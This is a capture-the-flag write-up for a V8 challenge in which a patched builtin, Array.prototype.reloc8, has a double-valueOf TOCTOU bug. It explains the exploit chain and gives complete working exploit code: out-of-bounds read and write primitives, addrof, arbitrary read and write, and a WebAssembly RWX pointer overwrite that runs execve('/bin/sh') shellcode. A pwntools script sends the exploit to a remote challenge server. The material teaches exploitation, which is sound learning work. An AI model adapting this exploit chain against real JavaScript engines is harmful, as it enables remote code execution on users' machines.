# reloc8 - nullCTF 2025 Writeup

**Category:** PWN  
**Difficulty:** Hard  
**Author:** tomadimitrie  
**Flag:** `nullctf{r3l0c473d_70_sh3ll}`

---

## Challenge Overview

This is a V8 (JavaScript engine) exploitation challenge where a custom built-in function `Array.prototype.reloc8()` was added with a Time-of-Check-Time-of-Use (TOCTOU) vulnerability. The goal is to exploit this bug to achieve arbitrary code execution and spawn a shell.

### Files Provided
- **`d8`** - V8 debugging shell binary
- **`patch.diff`** - Patch showing the vulnerable code added to V8
- **`snapshot_blob.bin`** - V8 startup snapshot
- **`server.py`** - Remote exploit server
- **`Dockerfile`** - Container environment
- **`flag.txt`** - Local test flag

---

## Understanding V8 Basics

### What is V8?
V8 is Google's JavaScript engine used in Chrome and Node.js. It compiles JavaScript to native machine code for execution.

### What is d8?
`d8` is V8's debugging shell - like Node.js but for raw V8 testing and debugging. You can run JavaScript files with `./d8 script.js`.

### V8 Memory Model - Key Concepts

#### 1. **Tagged Pointers vs Raw Values**

V8 uses two main ways to store array elements:

```javascript
// SMI (Small Integer) - Tagged
let int_arr = [1, 2, 3];
// Stored as: [tagged_value, tagged_value, tagged_value]
// Each value has extra bits marking it as an integer

// Packed Doubles - Raw 64-bit floats
let float_arr = [1.1, 2.2, 3.3];
// Stored as: [raw_double, raw_double, raw_double]
// Pure 8-byte floating point values, no tags
```

**Why this matters:** Since pointers are also 64-bit values, we can reinterpret a float as a pointer and vice versa!

#### 2. **JavaScript Arrays in Memory**

When you create an array, V8 creates this structure:

```
Memory Layout:

Address      | Content
-------------|------------------
0x1000       | Map pointer (object type info)
0x1008       | Properties pointer
0x1010       | Elements pointer → points to actual data
0x1018       | Length (number of elements)
             |
Elements:    |
0x2000       | [Element 0] = 1.1
0x2008       | [Element 1] = 2.2
0x2010       | [Element 2] = 3.3
0x2018       | [Element 3] = 4.4
```

---

## The Vulnerability - TOCTOU Bug

### What is TOCTOU?

**Time-of-Check-Time-of-Use** - A race condition where:
1. Check: Validate something is safe
2. **[GAP]** - Something changes here
3. Use: Use the now-invalid value

### The Vulnerable Code

Looking at `patch.diff`, the `ArrayReloc8` builtin has TWO `DECLARE_ARGS()` blocks:

```cpp
// FIRST BLOCK - Line 68 (Validation)
{
  DECLARE_ARGS();  // Calls Object::ToNumber() -> valueOf()
  
  if (from_val < 0 || from_val >= array_len) {
    THROW_ERROR("invalid from");
  }
  if (to_val < 0 || to_val >= array_len) {
    THROW_ERROR("invalid to");
  }
}

// SECOND BLOCK - Line 91 (Actual use)
{
  DECLARE_ARGS();  // Calls Object::ToNumber() AGAIN!
  
  // Copy element from from_val to to_val
  elements->set(to_val, elements->get(from_val));
}
```

### The Bug Explained

The `DECLARE_ARGS()` macro calls `Object::ToNumber()` which triggers JavaScript's `valueOf()` callback:

```javascript
let evil = {
    state: 0,
    valueOf() {
        if (this.state % 2 === 0) {
            this.state++;
            return 0;  // First call: return valid index
        }
        if (this.state % 2 === 1) {
            this.state++;
            return 10; // Second call: return out-of-bounds index!
        }
    }
};

arr.reloc8(evil, 1);
```

**What happens:**
1. **Validation phase:** `valueOf()` returns `0` → Passes bounds check ✓
2. **Use phase:** `valueOf()` returns `10` → Uses out-of-bounds index!

This gives us **Out-of-Bounds (OOB) access** to memory beyond our array!

---

## Exploitation Strategy - The Full Chain

```
Step 1: OOB Read/Write
   ↓
Step 2: addrof() primitive (leak object addresses)
   ↓
Step 3: Arbitrary Read/Write anywhere in memory
   ↓
Step 4: Find WebAssembly RWX memory
   ↓
Step 5: Overwrite with shellcode
   ↓
Step 6: Execute → Shell!
```

---

## Phase 1: Building OOB Primitives

### Helper Function - Dual-Return valueOf

```javascript
function make_arg(first_val, second_val) {
    let seen = false;
    return {
        valueOf() {
            if (!seen) {
                seen = true;
                return first_val;   // Returned on validation
            }
            return second_val;      // Returned on actual use
        }
    };
}
```

### Out-of-Bounds Read

```javascript
let arr = [1.1, 2.2, 3.3, 4.4];

function oob_read(idx) {
    // from: pass check with 0, actually use idx
    const from = make_arg(0, idx);
    // to: always use valid index 0
    const to = make_arg(1, 0);
    
    arr.reloc8(from, to);  // Copy arr[idx] to arr[0]
    return arr[0];         // Return the OOB value
}

// Read memory beyond array bounds
console.log(oob_read(10));  // Reads index 10 (out of bounds!)
```

**What's happening:**
```
Array bounds: [0, 1, 2, 3]
Reading index 10 accesses memory at: arr_base + (10 * 8 bytes)
This memory contains OTHER JavaScript objects!
```

### Out-of-Bounds Write

```javascript
function oob_write(idx, val) {
    arr[0] = val;                   // Put value to write
    const from = make_arg(0, 0);    // from: always valid
    const to = make_arg(1, idx);    // to: pass check, use idx
    
    arr.reloc8(from, to);           // Copy arr[0] to arr[idx]
}

// Write to out-of-bounds memory
oob_write(10, 13.37);
```

---

## Phase 2: Type Confusion - addrof() Primitive

### The Key Insight

We can confuse V8 about whether an array holds floats or objects!

```javascript
let float_arr = [1.1];     // V8 stores: raw 64-bit doubles
let obj_arr = [{x: 1}];    // V8 stores: tagged pointers
```

If we make V8 read an object pointer as if it's a float, we leak the object's **memory address**!

### Understanding the evil Object

```javascript
let evil = {
    state: 0,
    valueOf() {
        if (this.state % 2 === 0) return this.state++, 0;
        if (this.state % 2 === 1) return this.state++, 4;
    }
};
```

This alternates between returning `0` and `4`, creating a pattern: `0 → 4 → 0 → 4 → ...`

### The addrof() Exploit

```javascript
function addrof(obj) {
    let f = [1.1];        // Float array
    let a = [obj];        // Object array with our target object
    
    f.reloc8(evil, 0);    // Confuse the types!
    
    return ftoi(f[0]) & 0xffffffffn;  // Read object address as float
}
```

**Step-by-step:**
1. Create float array `f` and object array `a` with target object
2. Call `f.reloc8(evil, 0)`:
   - First `valueOf()`: `from=0, to=0` (validation passes)
   - Second `valueOf()`: `from=4, to=0` (confused access!)
3. This copies memory from a different location that confuses the type
4. Reading `f[0]` now gives us the object's address!

### Float ↔ Integer Conversion Helpers

```javascript
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u64 = new BigUint64Array(buf);

function ftoi(v) {
    f64[0] = v;           // Write as float
    return u64[0];        // Read as integer
}

function itof(v) {
    u64[0] = BigInt(v);   // Write as integer
    return f64[0];        // Read as float
}
```

These functions **reinterpret** the same 8 bytes as either float or integer.

---

## Phase 3: Arbitrary Read/Write (AAR/AAW)

### Arbitrary Address Read (aar)

```javascript
function aar(addr) {
    // Create fake array that points to target address
    let f = [
        itof(addr - 8n + 0x200000000n),  // Crafted pointer
        1.1, 
        1.2
    ];
    
    f.reloc8(0, evil);    // Type confusion trick
    return ftoi(f[0]);    // Read from arbitrary address
}
```

**Why `addr - 8n + 0x200000000n`?**
- `-8n`: Adjust for array header offset
- `+0x200000000n`: V8's pointer compression base address

### Arbitrary Address Write (aaw)

```javascript
function aaw(addr, v) {
    let f = [
        itof(addr - 8n + 0x200000000n),
        1.1,
        1.2
    ];
    
    f.reloc8(0, evil);    // Type confusion
    f[0] = itof(v);       // Write value to arbitrary address
}
```

Now we can read/write **anywhere** in the process memory!

---

## Phase 4: WebAssembly Shellcode Execution

### Why WebAssembly?

WebAssembly (WASM) modules have **RWX (Read-Write-Execute)** memory pages for JIT compilation. We can:
1. Find the RWX page
2. Write our shellcode
3. Execute it!

### The Shellcode (execve("/bin/sh"))

The WASM module contains this shellcode encoded as floats:

```asm
xor rdx, rdx              ; envp = NULL
xor rsi, rsi              ; argv = NULL
push rdx                  ; null terminator
mov rax, 0x68732f2f6e69622f  ; "/bin//sh"
push rax
mov rdi, rsp              ; rdi points to "/bin//sh"
xor rax, rax
mov al, 0x3b              ; syscall 59 (execve)
syscall
```

### Finding the RWX Page

```javascript
// Create WebAssembly instance
let wasm_code = new Uint8Array([...]); // Shellcode embedded in WASM
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
let shell = wasm_instance.exports.main;

// Leak addresses
let wasm_instance_addr = addrof(wasm_instance);

// Read trusted_data pointer (offset 0xc from instance)
let trusted_data = aar((wasm_instance_addr & 0xffffffffn) + 0xcn) & 0xffffffffn;

// Read RWX page address (offset 0x28 from trusted_data)
let wasm_rwx_addr = aar(trusted_data + 0x28n);

// Calculate shellcode location (offset 0x9a7 in RWX page)
let shellcode_addr = wasm_rwx_addr + 0x9a7n;
```

### Hijacking Execution

```javascript
// Overwrite function pointer to point to our shellcode
aaw(trusted_data + 0x28n, shellcode_addr);

// Call the WASM function → executes our shellcode!
shell();
```

**What happens:**
1. `shell()` tries to execute the WASM function
2. V8 follows the corrupted pointer to our shellcode
3. Shellcode executes `execve("/bin/sh")`
4. We get a shell! 🎉

---

## Full Exploit Code

```javascript
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u64 = new BigUint64Array(buf);

function ftoi(v) {
    f64[0] = v;
    return u64[0];
}

function itof(v) {
    u64[0] = BigInt(v);
    return f64[0];
}

let arr = [1.1, 2.2, 3.3, 4.4];

let evil = {
    state: 0,
    valueOf() {
        if (this.state % 2 === 0) return this.state++, 0;
        if (this.state % 2 === 1) return this.state++, 4;
    }
};

function addrof(obj) {
    let f = [1.1];
    let a = [obj];
    f.reloc8(evil, 0);
    return ftoi(f[0]) & 0xffffffffn;
}

function aar(addr) {
    let f = [itof(addr - 8n + 0x200000000n), 1.1, 1.2];
    f.reloc8(0, evil);
    return ftoi(f[0]);
}

function aaw(addr, v) {
    let f = [itof(addr - 8n + 0x200000000n), 1.1, 1.2];
    f.reloc8(0, evil);
    f[0] = itof(v);
}

// WebAssembly module with shellcode
let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,4,4,1,112,0,0,5,3,1,0,1,7,17,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,133,1,1,130,1,0,65,0,68,0,0,0,0,0,0,0,0,57,3,0,65,0,68,106,59,88,144,144,144,235,11,57,3,0,65,0,68,104,47,115,104,0,91,235,11,57,3,0,65,0,68,104,47,98,105,110,89,235,11,57,3,0,65,0,68,72,193,227,32,144,144,235,11,57,3,0,65,0,68,72,1,203,83,144,144,235,11,57,3,0,65,0,68,72,137,231,144,144,144,235,11,57,3,0,65,0,68,72,49,246,72,49,210,235,11,57,3,0,65,0,68,15,5,144,144,144,144,235,11,57,3,0,65,42,11]);

let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);
let shell = wasm_instance.exports.main;

// Find RWX memory
let trusted_data = aar((addrof(wasm_instance) & 0xffffffffn) + 0xcn) & 0xffffffffn;
let wasm_rwx_addr = aar(trusted_data + 0x28n);
let shellcode_addr = wasm_rwx_addr + 0x9a7n;

console.log("[+] trusted_data: 0x" + trusted_data.toString(16));
console.log("[+] wasm_rwx_addr: 0x" + wasm_rwx_addr.toString(16));
console.log("[+] shellcode_addr: 0x" + shellcode_addr.toString(16));

// Hijack execution
aaw(trusted_data + 0x28n, shellcode_addr);

// Pop shell!
shell();
```

---

## Connecting to Remote Server

The remote server expects **base64-encoded** JavaScript code.

### Python Exploit Script

```python
from pwn import *
import base64

r = remote('34.118.61.99', 10050)

with open('exploit.js', 'r') as f:
    exploit = f.read()

# Encode to base64
exploit_b64 = base64.b64encode(exploit.encode()).decode()

r.sendline(exploit_b64.encode())
r.interactive()
```

### Getting the Flag

```bash
$ python3 send.py
[+] Opening connection to 34.118.61.99 on port 10050: Done
[*] Switching to interactive mode
$ ls
flag_8ux6zbDIZ2WgQQXV.txt
$ cat flag_8ux6zbDIZ2WgQQXV.txt
nullctf{r3l0c473d_70_sh3ll}
```

---

## Key Takeaways & Learning Points

### 1. **TOCTOU Vulnerabilities**

The bug exists because `valueOf()` is called **twice** - once during validation and once during use. Always be suspicious of code that:
- Validates user input
- Calls user-controlled code (callbacks)
- Uses the validated value later

### 2. **Type Confusion in V8**

V8 distinguishes between:
- **SMI (Small Integer):** Tagged integers with metadata
- **Packed Doubles:** Raw 64-bit floats
- **Packed Elements:** Tagged object pointers

By confusing these types, we can:
- Leak addresses (read pointer as float)
- Create fake objects (write float as pointer)

### 3. **WebAssembly as Attack Vector**

WASM is commonly used in browser exploits because:
- Has RWX memory pages for JIT compilation
- Predictable memory layout
- Easy to find in memory

### 4. **Why Floats Instead of Integers?**

```javascript
let int_arr = [1, 2, 3];      // Tagged values (extra metadata bits)
let float_arr = [1.1, 2.2];   // Raw 64-bit values (no tags)
```

Floats are **raw 8-byte values**, same size as pointers. This makes type confusion easier!

### 5. **Pointer Compression**

Modern V8 uses **pointer compression** to save memory:
- Pointers are stored as 32-bit offsets
- Base address is added at runtime
- That's why we add `0x200000000n` in our exploit

---

## Common Confusion Points (From Learning Session)

### Q: "Why do those `oob_read()` values look weird?"

```javascript
console.log(oob_read(10));  // 3.3267913058887005e+257
```

**Answer:** That's a **pointer disguised as a float**! When we read out-of-bounds, we're reading memory that contains:
- Other JavaScript objects
- Pointers to those objects
- Metadata structures

When interpreted as floats, they look like random huge numbers.

### Q: "Why didn't `float_arr` appear at the expected index?"

**Answer:** V8's memory allocator doesn't guarantee adjacent allocation. Different V8 versions, heap states, and GC activity affect object placement. That's why we used the `evil` object trick instead - it doesn't rely on finding adjacent arrays!

### Q: "What's the difference between `addrof()` and `aar()`?"

- **`addrof(obj)`**: Get the memory address of a JavaScript object
- **`aar(addr)`**: Read 8 bytes from any memory address
- **`aaw(addr, val)`**: Write 8 bytes to any memory address

Think of it as: `addrof` finds WHERE something is, then `aar/aaw` lets you read/write there.

### Q: "Why do we need WebAssembly?"

We need **executable memory**. Regular JavaScript doesn't give us RWX pages, but WebAssembly does (for JIT compilation). We hijack this to run our shellcode.

---

## Additional Resources

### Understanding V8 Internals
- [V8 Blog - Elements Kinds](https://v8.dev/blog/elements-kinds)
- [V8 Exploitation Tutorial by LiveOverflow](https://liveoverflow.com/tag/v8/)
- [Pointer Compression in V8](https://v8.dev/blog/pointer-compression)

### Similar CTF Challenges
- Google CTF 2018 - Justintime
- PlaidCTF 2019 - Plaid Party Planning
- 35C3 CTF - Krautflare

### Tools for V8 PWN
- **Turbolizer:** V8's internal graph visualization tool
- **d8 debug flags:** `--allow-natives-syntax`, `--trace-opt`
- **GDB with V8 scripts:** For debugging exploits

---

## Conclusion

This challenge demonstrates a classic **TOCTOU vulnerability** in V8's custom built-in function. By exploiting the double-call to `valueOf()`, we achieved:

1. ✅ Out-of-bounds read/write
2. ✅ Type confusion (addrof primitive)
3. ✅ Arbitrary memory access
4. ✅ Code execution via WebAssembly
5. ✅ Shell access

The key insight was recognizing that JavaScript callbacks (`valueOf()`) can be called multiple times during a single operation, allowing us to bypass bounds checks and corrupt memory structures.

**Flag:** `nullctf{r3l0c473d_70_sh3ll}`

---
